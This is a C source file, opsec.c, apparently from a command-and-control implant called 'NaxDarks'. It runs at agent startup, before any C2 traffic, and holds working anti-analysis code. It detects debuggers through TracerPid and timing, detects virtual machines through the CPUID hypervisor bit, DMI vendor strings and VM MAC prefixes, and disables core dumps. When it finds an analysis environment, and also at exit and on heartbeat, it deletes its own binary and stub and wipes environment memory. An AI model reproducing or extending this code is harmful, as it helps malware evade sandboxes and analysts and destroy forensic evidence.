/* opsec.c — Anti-debug, anti-VM, self-destruct for NaxDarks
 * Compiled only when -DNAX_OPSEC=1 is passed.
 * Called at agent startup BEFORE any C2 communication.
 */
#ifdef NAX_OPSEC

#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

/* ================================================================
 * 1. DEBUGGER DETECTION
 * ================================================================*/

/* 1b. Timing check: debugger single-stepping causes measurable delay */
static int detect_timing(void) {
    struct timespec t1, t2;
    clock_gettime(CLOCK_MONOTONIC, &t1);

    /* Do some trivial work */
    volatile int x = 0;
    for (int i = 0; i < 100000; i++) x += i;

    clock_gettime(CLOCK_MONOTONIC, &t2);

    long delta_us = (t2.tv_sec - t1.tv_sec) * 1000000L +
                    (t2.tv_nsec - t1.tv_nsec) / 1000L;

    /* 100k iterations should take <5ms on any modern CPU.
     * Under a debugger/strace it takes 50ms+. Threshold: 50ms. */
    return (delta_us > 50000) ? 1 : 0;
}

/* 1c. Breakpoint detection: check /proc/self/status for TracerPid */
static int detect_tracer(void) {
    char buf[4096];
    int fd = open("/proc/self/status", 0);
    if (fd < 0) return 0;
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = '\0';

    char *tp = strstr(buf, "TracerPid:");
    if (!tp) return 0;
    tp += 10;
    while (*tp == ' ' || *tp == '\t') tp++;
    /* TracerPid: 0 = no tracer, anything else = debugger attached */
    return (*tp != '0') ? 1 : 0;
}

/* ================================================================
 * 2. VIRTUAL MACHINE DETECTION
 * ================================================================ */

/* 2a. CPUID hypervisor bit (bit 31 of ECX from CPUID leaf 1) */
static int detect_cpuid_hypervisor(void) {
#if defined(__x86_64__) || defined(__i386__)
    unsigned int eax, ebx, ecx, edx;
    __asm__ volatile("cpuid" : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx) : "a"(1));
    return (ecx & (1U << 31)) ? 1 : 0;
#else
    return 0; /* ARM doesn't have CPUID hypervisor bit */
#endif
}

/* 2b. DMI/SMBIOS strings: check product_name, sys_vendor, board_vendor */
static int detect_dmi_strings(void) {
    const char *paths[] = {
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/sys_vendor",
        "/sys/class/dmi/id/board_vendor",
        "/sys/class/dmi/id/bios_vendor",
        NULL
    };
    const char *vm_strings[] = {
        "VirtualBox", "VMware", "QEMU", "KVM", "Xen",
        "Hyper-V", "Microsoft Corporation", "Bochs",
        "Parallels", "innotek", "Red Hat", "Amazon EC2",
        NULL
    };

    for (int i = 0; paths[i]; i++) {
        char buf[256] = "";
        int fd = open(paths[i], 0);
        if (fd < 0) continue;
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n <= 0) continue;
        buf[n] = '\0';
        /* Strip trailing newline */
        if (n > 0 && buf[n-1] == '\n') buf[n-1] = '\0';

        for (int j = 0; vm_strings[j]; j++) {
            if (strstr(buf, vm_strings[j]))
                return 1;
        }
    }
    return 0;
}

/* 2c. MAC address prefixes known to belong to VMs */
static int detect_vm_mac(void) {
    /* Common VM MAC OUI prefixes (first 3 bytes) */
    static const char *vm_macs[] = {
        "08:00:27",  /* VirtualBox */
        "0a:00:27",  /* VirtualBox */
        "00:0c:29",  /* VMware */
        "00:50:56",  /* VMware */
        "00:05:69",  /* VMware */
        "00:1c:42",  /* Parallels */
        "00:16:3e",  /* Xen */
        "52:54:00",  /* QEMU/KVM */
        "00:15:5d",  /* Hyper-V */
        NULL
    };

    /* Read MAC addresses from /sys/class/net/*/
    char buf[4096];
    int fd = open("/proc/net/dev", 0);
    if (fd < 0) return 0;
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = '\0';

    /* Parse interface names */
    char *line = buf;
    while (line && *line) {
        char *eol = strchr(line, '\n');
        char *colon = strchr(line, ':');
        if (colon && (!eol || colon < eol)) {
            char *p = line;
            while (*p == ' ') p++;
            char iface[32];
            int il = (int)(colon - p);
            if (il > 0 && il < 31) {
                memcpy(iface, p, il);
                iface[il] = '\0';

                /* Skip loopback */
                if (strcmp(iface, "lo") != 0) {

                    /* testing */
//                    char state_path[128];
//                    snprintf(state_path, sizeof(state_path), "/sys/class/net/%s/operstate", iface);
//                    int sf = open(state_path, 0);
//                    if (sf >= 0) {
//                        char state[16] = "";
//                        int r = read(sf, state, sizeof(state) - 1);
//                        close(sf);
//                        if (r > 0) {
//                            state[r] = '\0';
//                            char *nl = strchr(state, '\n');
//                            if (nl) *nl = '\0';
//                            /* Si la interfaz está DOWN, la saltamos */
//                            if (strcmp(state, "down") == 0) continue;
//                        }
//                    }

                    char mac_path[128], mac[32] = "";
                    snprintf(mac_path, sizeof(mac_path), "/sys/class/net/%s/address", iface);
                    int mfd = open(mac_path, 0);
                    if (mfd >= 0) {
                        int mr = read(mfd, mac, sizeof(mac) - 1);
                        close(mfd);
                        if (mr > 0) {
                            mac[mr] = '\0';
                            for (int i = 0; vm_macs[i]; i++) {
                                if (strncmp(mac, vm_macs[i], 8) == 0)
                                    return 1;
                            }
                        }
                    }
                }
            }
        }
        line = eol ? eol + 1 : NULL;
    }
    return 0;
}

/* ================================================================
 * 3. SELF-DESTRUCT
 * ================================================================ */

/* Get our own binary path from /proc/self/exe */
static int get_self_path(char *out, int cap) {
    int n = readlink("/proc/self/exe", out, cap - 1);
    if (n <= 0) return -1;
    out[n] = '\0';
    /* If running from memfd, path will be /memfd:xxx (deleted) — skip */
    if (strstr(out, "memfd:") || strstr(out, "(deleted)"))
        return -1;
    return 0;
}

/* Delete our binary from disk */
static void self_delete(void) {
    char path[4096];

    /* Stub binary (if we were wrapped by one) */
    const char *stub_path = getenv("NAX_STUB_PATH");
    if (stub_path && *stub_path) {
        unlink(stub_path);
    }

    /* Our own binary (only when running from a real path on disk) */
    if (get_self_path(path, sizeof(path)) == 0) {
        unlink(path);
    }
}


/* Zero writable memory segments (stack canary area, heap, etc.)
 * Best-effort: zeros the .bss and heap regions we can reach. */
static void zero_memory(void) {
    /* Zero environ pointers (may contain sensitive data) */
    extern char **environ;
    if (environ) {
        for (int i = 0; environ[i]; i++) {
            volatile char *p = (volatile char *)environ[i];
            while (*p) { *p = '\0'; p++; }
        }
    }
}

/* =================================================================
 * 4. PUBLIC ENTRY POINT
 * ================================================================= */

/* Called from main() before any C2 communication.
 * If hostile environment detected → self-destruct and exit silently. */
void nax_opsec_check(void) {
    int hostile = 0;


    prctl(PR_SET_DUMPABLE, 0);

    /* Debugger checks */
    if (detect_tracer())   hostile = 1;
    if (detect_timing())   hostile = 1;

    /* VM checks */
    if (detect_cpuid_hypervisor()) hostile = 1;
    if (detect_dmi_strings())      hostile = 1;
    if (detect_vm_mac())           hostile = 1;

    if (hostile) {
        self_delete();
        zero_memory();
        _exit(0); /* silent exit, no cleanup */
    }
}

/* Called at agent exit (normal shutdown or signal) */
void nax_opsec_cleanup(void) {
    self_delete();
    zero_memory();
}

void nax_opsec_heartbeat(void) {
    if (detect_tracer()) {
        self_delete();
        zero_memory();
        _exit(0);
    }
}
#endif /* NAX_OPSEC */
